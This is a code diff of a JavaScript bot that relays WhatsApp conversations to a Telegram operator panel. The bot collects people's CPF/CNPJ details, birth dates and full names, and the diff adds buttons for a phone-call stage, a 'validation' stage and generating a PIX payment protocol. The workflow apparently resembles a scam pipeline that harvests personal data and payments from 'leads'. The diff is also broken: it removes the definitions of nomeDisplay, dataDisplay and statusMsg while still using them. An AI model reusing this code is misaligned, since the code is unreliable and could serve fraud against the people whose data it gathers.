@@ -206,29 +206,32 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
         'na_fila': '🕐'
     }[status] || '⏳';
 
-    const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
-    const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;
-
-    let statusMsg = '';
-    if (status === 'preenchendo_data') statusMsg = '📝 <i>Aguardando data de nascimento...</i>';
-    else if (status === 'preenchendo_nome') statusMsg = '📝 <i>Aguardando nome completo...</i>';
-    else if (status === 'validado') statusMsg = '✅ <b>CADASTRO CONCLUÍDO — Enviado para a fila!</b>';
-    else if (status === 'na_fila') {
-        const pos = getQueuePosition(chatId);
-        statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
-    }
-
     const tipoLabel = tipo === 'CNPJ' ? '🏢 Pessoa Jurídica (CNPJ)' : '👤 Pessoa Física (CPF)';
     const dataLabel = tipo === 'CNPJ' ? 'Data de Abertura' : 'Data de Nascimento';
     const nomeLabel = tipo === 'CNPJ' ? 'Razão Social' : 'Nome Completo';
 
-    return `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
+    const text = `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
         `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
         `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
         `📋 <b>Dados do Titular:</b>\n` +
         `• ${dataLabel}: ${dataDisplay}\n` +
         `• ${nomeLabel}: ${nomeDisplay}\n\n` +
         `📊 <b>Status:</b> ${statusMsg}`;
+
+    const reply_markup = {
+        inline_keyboard: [
+            [
+                { text: "📞 Etapa 2 (Ligação)", callback_data: `etapa:2:${chatId}` },
+                { text: "🔐 Etapa 3 (Validação)", callback_data: `etapa:3:${chatId}` }
+            ],
+            [
+                { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix:${chatId}` },
+                { text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }
+            ]
+        ]
+    };
+
+    return { text, reply_markup };
 }
 
 // --- CLIENTE WHATSAPP ---
@@ -690,7 +693,8 @@ async function processIncomingMessage(msg, targetChatId) {
         }
 
         // Envia mensagem inicial no Telegram (painel de cadastro)
-        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType));
+        const { text: txtInit, reply_markup } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType);
+        const tgMsgId = await notifyTelegram(txtInit, null, reply_markup);
 
         chatSessions.set(targetChatId, {
             mode: 'bot',
@@ -723,7 +727,8 @@ async function processIncomingMessage(msg, targetChatId) {
         await chat.sendStateTyping();
 
         // Envia painel de cadastro no Telegram
-        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data'));
+        const { text: txtEsp, reply_markup: rmEsp } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data');
+        const tgMsgId = await notifyTelegram(txtEsp, null, rmEsp);
 
         // Notifica contato espontâneo
         await notifyTelegram(
@@ -794,10 +799,8 @@ async function processIncomingMessage(msg, targetChatId) {
 
         // Atualiza o painel no Telegram
         if (currentSession.tgMsgId) {
-            await notifyTelegram(
-                buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome', currentSession.docType),
-                currentSession.tgMsgId
-            );
+            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome', currentSession.docType);
+            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
         }
 
         if (isPJ) {
@@ -860,10 +863,8 @@ async function processIncomingMessage(msg, targetChatId) {
                 const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
 
                 if (currentSession.tgMsgId) {
-                    await notifyTelegram(
-                        buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType),
-                        currentSession.tgMsgId
-                    );
+                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
                 }
 
                 const frenteMsg = clientesFrente > 0
